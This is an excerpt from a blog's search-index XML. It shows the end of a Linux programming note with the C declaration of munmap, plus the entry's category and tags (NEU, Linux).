<span class="token keyword">int</span> <span class="token function">munmap</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>addr<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>NEU</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
</search>
